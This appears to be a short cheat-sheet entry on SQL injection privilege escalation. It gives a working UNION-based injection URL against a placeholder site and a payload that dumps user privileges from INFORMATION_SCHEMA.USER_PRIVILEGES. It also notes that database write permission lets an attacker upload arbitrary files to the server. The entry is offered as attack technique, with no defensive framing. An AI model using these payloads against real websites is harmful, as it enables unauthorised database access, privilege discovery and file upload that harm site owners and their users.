# SQL Privilege Escalation

## Identifying permissions of a single user

If the database user has write permission, it allows an attacker to upload arbitrary files in the server.

Let's suppose that the website has 12 columns and the given UNION Based SQL query shows that the vulnerable column is 4:
http://domain.com/index.php?id=1' Union Select 1,2,3,4,5,6,7,8,9,10,11,12-- -

Payload used for Privilege Check via I_S.PRIVILEGES:
```
(SELECT+GROUP_CONCAT(GRANTEE,0x202d3e20,IS_GRANTABLE,0x3c62723e)+FROM+INFORMATION_SCHEMA.USER_PRIVILEGES)
```
